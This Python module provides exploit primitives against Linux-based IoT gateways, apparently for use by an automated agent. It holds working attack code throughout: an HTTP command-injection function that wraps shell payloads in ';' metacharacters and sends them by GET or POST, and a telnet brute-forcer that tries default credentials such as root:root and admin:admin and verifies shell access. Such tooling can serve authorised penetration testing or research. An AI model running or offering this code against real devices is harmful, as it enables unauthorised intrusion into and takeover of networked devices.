"""linux_exploits.py â€” Exploit primitives targeting Linux-based IoT gateways.

All functions return structured dicts for agent consumption.
"""

import socket
import time

import requests


def http_cmd_injection(ip: str, port: int = 80, path: str = "/",
                       param: str = "cmd", payload: str = "id",
                       method: str = "GET", timeout: float = 10.0) -> dict:
    """Inject a shell command via an HTTP parameter.

    Wraps the payload in shell metacharacters: ;{payload};
    Tries both query-string (GET) and form-body (POST) delivery.
    """
    injected = f"; {payload} ;"
    url = f"http://{ip}:{port}{path}"
    try:
        if method.upper() == "GET":
            resp = requests.get(url, params={param: injected}, timeout=timeout)
        else:
            resp = requests.post(url, data={param: injected}, timeout=timeout)
        return {
            "success": True,
            "attack": "http_cmd_injection",
            "status_code": resp.status_code,
            "body_snippet": resp.text[:1024],
            "payload": injected,
            "url": resp.url,
        }
    except requests.ConnectionError as e:
        return {"success": False, "attack": "http_cmd_injection",
                "details": f"Connection failed: {e}"}
    except requests.Timeout:
        return {"success": False, "attack": "http_cmd_injection",
                "details": "HTTP request timed out"}


def brute_force_telnet(ip: str, port: int = 23,
                       wordlist: list[str] | None = None,
                       timeout: float = 8.0) -> dict:
    """Attempt telnet login with a short credential list.

    wordlist entries are "user:password" strings.
    Returns on first successful login.
    """
    if wordlist is None:
        wordlist = ["root:root", "root:password", "admin:admin"]

    results: list[dict] = []
    for cred in wordlist:
        user, passwd = cred.split(":", 1)
        outcome = _try_telnet_login(ip, port, user, passwd, timeout)
        results.append(outcome)
        if outcome["authenticated"]:
            return {
                "success": True,
                "attack": "brute_force_telnet",
                "credential": cred,
                "attempts": results,
            }

    return {
        "success": False,
        "attack": "brute_force_telnet",
        "details": "All credentials exhausted",
        "attempts": results,
    }


def _read_until(sock: socket.socket, marker: bytes, timeout: float) -> bytes:
    """Read from socket until *marker* is found or timeout expires."""
    data = b""
    deadline = time.time() + timeout
    while time.time() < deadline:
        remaining = deadline - time.time()
        if remaining <= 0:
            break
        sock.settimeout(max(remaining, 0.1))
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if marker in data:
                return data
        except socket.timeout:
            continue
    return data


def _try_telnet_login(ip: str, port: int, user: str, passwd: str,
                      timeout: float) -> dict:
    """Single telnet login attempt over a raw TCP socket."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        _read_until(s, b"login:", timeout)
        s.sendall(user.encode() + b"\n")
        _read_until(s, b"assword:", timeout)
        s.sendall(passwd.encode() + b"\n")
        time.sleep(1)
        s.sendall(b"echo APIOT_AUTH_OK\n")
        response = _read_until(s, b"APIOT_AUTH_OK", 5)
        s.close()
        authenticated = b"APIOT_AUTH_OK" in response
        return {"user": user, "password": passwd, "authenticated": authenticated}
    except (EOFError, ConnectionRefusedError, OSError, socket.timeout) as e:
        return {"user": user, "password": passwd, "authenticated": False,
                "error": str(e)}
